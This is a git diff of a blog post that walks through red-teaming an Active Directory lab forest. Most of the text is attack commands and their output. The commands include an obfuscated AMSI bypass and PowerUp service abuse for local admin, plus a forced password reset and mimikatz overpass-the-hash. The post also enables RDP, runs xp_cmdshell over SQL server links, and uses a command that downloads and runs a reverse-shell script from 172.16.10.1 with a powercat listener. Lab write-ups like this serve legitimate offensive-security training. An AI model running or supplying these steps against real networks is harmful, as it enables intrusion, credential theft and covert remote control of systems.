@@ -1,5 +1,5 @@
 ---
-title: "cosmos, part 1: red-teaming corporate AD environments"
+title: "cosmos, part 1: red-teaming corporate active directory forests"
 date: 2024-09-19T10:56:20-04:00
 draft: false
 type: "post"
@@ -99,30 +99,30 @@ another thing about workstations: they often have vulnerabilities, outdated soft
 
 first, let's disable AMSI (Antimalware Scan Interface). AMSI is designed to prevent malicious scripts from running, so i'll have to write an obfuscated command to evade detection by signature-based security tools.
 
-```powershell
-sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
+```sh
+PS C:\bilal\AD> sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
 ```
 
 now i can run my own tools without interference.
 
 next, let's change the execution policy.
 
-```powershell
-Powershell -ep bypass
+```sh
+PS C:\bilal\AD> Powershell -ep bypass
 ```
 
 this launches PowerShell with the execution policy set to `bypass`. the execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files + runs scripts. by bypassing it, scripts can be run without restrictions.
 
 i then used `PowerUp` to find vectors of privilege escalation. using it along with `Invoke-AllChecks` runs a series of checks to identify vectors like misconfigurations, vulnerable services, or unquoted service paths.
 
-```powershell
-.\PowerUp.ps1
-Invoke-AllChecks
+```sh
+PS C:\bilal\AD> .\PowerUp.ps1
+PS C:\bilal\AD> Invoke-AllChecks
 ```
 
 i get back an interesting piece of information.
 
-```powershell
+```sh
 ServiceName : vds
 Path : C:\Windows\System32\vds.exe
 StartName : LocalSystem
@@ -132,16 +132,16 @@ CanRestart : True
 
 let's exploit this vulnerable service `VDS` to add our user `bilal` to the local Administrators group.
 
-```powershell
-Invoke-ServiceAbuse -ServiceName vds -UserName Nebula\bilal
+```sh
+PS C:\bilal\AD> Invoke-ServiceAbuse -ServiceName vds -UserName Nebula\bilal
 ```
 
 this exploits a vulnerability in `VDS` (Virtual Disk Service). it modifies the service to run a command [`net localgroup Administrators Nebula\bilal /add`] that will add my user to the Administrators group. this works because `VDS` runs with `SYSTEM` privileges. 
 
 logging back in so the changes take effect, i can verify:
 
-```powershell
-net localgroup Administrators
+```sh
+PS C:\bilal\AD> net localgroup Administrators
 
 --------------------------------------
 Administrator
@@ -153,20 +153,20 @@ Nebula\bilal
 
 get the list of domain users.
 
-```powershell
-Get-NetUser | select samaccountname
+```sh
+PS C:\bilal\AD> Get-NetUser | select samaccountname
 ```
 
 get the list of domain computers.
 
-```powershell
-Get-netcomputer
+```sh
+PS C:\bilal\AD> Get-netcomputer
 ```
 
 get the list of domain groups.
 
-```powershell
-Get-netgroup
+```sh
+PS C:\bilal\AD> Get-netgroup
 
 Administrators
 Users
@@ -217,8 +217,8 @@ SQLManagers
 
 check domain trusts.
 
-```powershell
-Get-NetDomainTrust
+```sh
+PS C:\bilal\AD> Get-NetDomainTrust
 
 SourceName               TargetName    TrustType     TrustDirection
 -----------              -----------   ----------    ---------------
@@ -227,8 +227,8 @@ Nebula.Cosmos.Local      Cosmos.Local  ParentChild   Bidirectional
 
 before moving on, it's important to run `nslookup` on each machine in the environment to collect their IP addresses. it's also helpful to map out a graphical representation of the AD relationships, using BloodHound.
 
-```powershell
-PS C:\ad\tools> cd .\BloodHound-master\BloodHound-master\
+```sh
+PS C:\bilal\AD>  cd .\BloodHound-master\BloodHound-master\
 PS C:\ad\tools\BloodHound-master\BloodHound-master> cd .\Ingestors\
 PS C:\ad\tools\BloodHound-master\BloodHound-master\Ingestors> . .\SharpHound.ps1
 PS C:\ad\tools\BloodHound-master\BloodHound-master\Ingestors> Invoke-BloodHound -CollectionMethod All
@@ -269,8 +269,8 @@ it's clear that UAT servers are critical in the SDLC, but they're often overlook
 
 earlier, running BloodHound revealed that the `bilal` user could force a password change for the `UATADMIN` user. let's exploit this using PowerView.
 
-```powershell
-PS C:\ad\tools> Set-DomainUserPassword -Identity UATADMIN -Verbose
+```sh
+PS C:\bilal\AD>  Set-DomainUserPassword -Identity UATADMIN -Verbose
 cmdlet Set-DomainUserPassword at command pipeline position 1
 Supply values for the following parameters:
 AccountPassword: ********
@@ -282,8 +282,8 @@ this PowerView command allows me to forcibly change the password of another user
 
 using mimikatz, i can perform an overpass-the-hash attack. this is when an attacker isn't able to access the cleartext password of a target, but can acquire a Kerberos ticket armed with just the NTLM hash of the password.
 
-```powershell
-PS C:\ad\tools> Invoke-Mimikatz -Command "sekurlsa::pth /user:uatadmin /domain:nebula.cosmos.local /ntlm:271B74BE505CD48CEF768D0D973E59E7 /run:powershell.exe"
+```sh
+PS C:\bilal\AD>  Invoke-Mimikatz -Command "sekurlsa::pth /user:uatadmin /domain:nebula.cosmos.local /ntlm:271B74BE505CD48CEF768D0D973E59E7 /run:powershell.exe"
 
   .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
@@ -318,7 +318,7 @@ using the NTLM hash instead of the password to authenticate launches a new Power
 
 i can then add `bilal` to the local Administrators group on both the `UATADMIN` and `UATSRV` machines. 
 
-```powershell
+```sh
 PS C:\Windows\system32> $sess = New-PSSession -ComputerName uatsrv.nebula.cosmos.local 
 PS C:\Windows\system32> Enter-PSSession -Session $sess [uatsrv.nebula.cosmos.local]: PS C:\Users\uatadmin\Documents> net localgroup administrators /add nebula\bilal 
 
@@ -327,7 +327,7 @@ The command completed successfully.
 
 finally, let's enable RDP on the machine. i'll modify the Windows Registry to allow RDP connections, then enable the necessary firewall rule. this will give me GUI access to the machine, which could come in handy for further exploitation + exfiltration.
 
-```powershell
+```sh
 [uatsrv.nebula.cosmos.local]: PS C:\Users\uatadmin\Documents> whoami;hostname nebula\uatadmin
 uatsrv 
 [uatsrv.nebula.cosmos.local]: PS C:\Users\uatadmin\Documents> Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
@@ -344,8 +344,8 @@ this is a dev server that hosts critical database services. dev servers are used
 
 these environments usually contain valuable intellectual property (code) and have direct connections to production systems. let's look for more information the SQL Server setup. you can do this with `PowerUpSQL.ps1`.
 
-```powershell
-PS C:\ad\tools\PowerUpSQL-master\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+```sh
+PS C:\ad\tools\PowerUpSQL-master>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
 
 VERBOSE: Creating runspace pool and session states
 
@@ -366,8 +366,8 @@ devsrv.nebula.cosmos.local      devsrv.nebula.cosmos.local,1433  Accessible
 USER                             USER                            Not Accessible
 ```
 
-```powershell
-PS C:\ad\tools\PowerUpSQL-master\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+```sh
+PS C:\ad\tools\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 
 VERBOSE: devsrv.nebula.cosmos.local,1433 : Connection Success.
 
@@ -415,7 +415,7 @@ ActiveSessions : 1
 
   
 
-PS C:\ad\tools\PowerUpSQL-master\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance devsrv.nebula.cosmos.local -Verbose
+PS C:\bilal\AD>  Get-SQLServerLinkCrawl -Instance devsrv.nebula.cosmos.local -Verbose
 
 VERBOSE: devsrv.nebula.cosmos.local : Connection Success.
 
@@ -432,8 +432,8 @@ VERBOSE: - Link Path to server: DEVSRV
 
 luckily for me, i have sysadmin rights on this instance. meaning i can run OS commands, like `whoami` on the machine. 
 
-```powershell
-PS C:\ad\tools\PowerUpSQL-master\PowerUpSQL-master> Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command whoami
+```sh
+PS C:\bilal\AD>  Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command whoami
 
   
 
@@ -447,10 +447,10 @@ devsrv.nebula.cosmos.local   devsrv.nebula.cosmos.local  nebula\devsqladmin
 
 i'm now going to build a backdoor into this instance. to do this, i'll set up a PowerCat listener and use a PowerShell reverse shell script.
 
-```powershell
-Get-SQLServerLinkCrawl -Instance devsrv.Nebula.Cosmos.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.10.1/Invoke-PowerShellTCP-reverse.ps1'')"'
+```sh
+PS C:\bilal\AD> Get-SQLServerLinkCrawl -Instance devsrv.Nebula.Cosmos.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.10.1/Invoke-PowerShellTCP-reverse.ps1'')"'
 
-Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command "powershell iex (New-Object Net.WebClient).DownloadString('http://172.16.10.1/Invoke-PowerShellTcp-reverse.ps1')"
+PS C:\bilal\AD> Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command "powershell iex (New-Object Net.WebClient).DownloadString('http://172.16.10.1/Invoke-PowerShellTcp-reverse.ps1')"
 
 ComputerName Instance CommandResults
 
@@ -459,7 +459,7 @@ ComputerName Instance CommandResults
 devsrv.nebula.cosmos.local devsrv.nebula.cosmos.local
 
 
-PS C:\ad\tools> powercat -l -v -p 443 -t 555555
+PS C:\bilal\AD>  powercat -l -v -p 443 -t 555555
 
 VERBOSE: Set Stream 1: TCP
 
